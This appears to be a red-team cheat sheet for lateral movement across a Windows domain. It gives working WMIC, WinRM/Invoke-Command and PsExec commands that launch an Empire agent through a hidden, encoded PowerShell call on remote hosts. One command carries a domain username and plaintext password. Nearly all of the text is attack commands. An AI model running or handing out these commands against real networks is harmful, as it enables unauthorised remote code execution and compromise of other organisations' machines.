### Remoteing WMIC

```
wmic /node:computername /user:domainname\username path win32_process call create "**empire launcher string here**"

wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "powershell.exe -NoP -sta -NonI -W Hidden -Enc fjwkefjlkdjd"


```

### WinRM
```
#WinRM is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI, so you can think of it as an HTTP based API for WMI.

#The easiest way to detect whether WinRM is available is by seeing if the port is opened. WinRM will listen on one of two ports:

    5985/tcp (HTTP)
    5986/tcp (HTTPS)
    
   Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta 
   
   C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nastyCutt3r -h -d powershell.exe "enable-psremoting -force"  
http://www.harmj0y.net/blog/empire/expanding-your-empire/

```
